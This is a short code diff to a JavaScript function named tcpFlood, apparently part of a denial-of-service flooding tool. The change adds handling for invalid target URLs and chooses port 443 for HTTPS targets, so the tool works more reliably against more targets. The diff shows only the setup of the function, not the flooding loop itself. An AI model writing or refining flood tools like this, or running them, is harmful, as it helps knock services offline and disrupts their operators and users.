@@ -7,9 +7,15 @@ function tcpFlood(target, threads) {
   threads = threads && threads > 0 ? threads : 1;
 
   try {
-    const url = new URL(target);
+    let url;
+    try {
+      url = new URL(target);
+    } catch (e) {
+      console.error("Invalid URL:", target);
+      return;
+    }
     const hostname = url.hostname;
-    const port = url.port || 80;
+    const port = url.port || (url.protocol === 'https:' ? 443 : 80);
 
     for (let i = 0; i < threads; i++) {
       try {
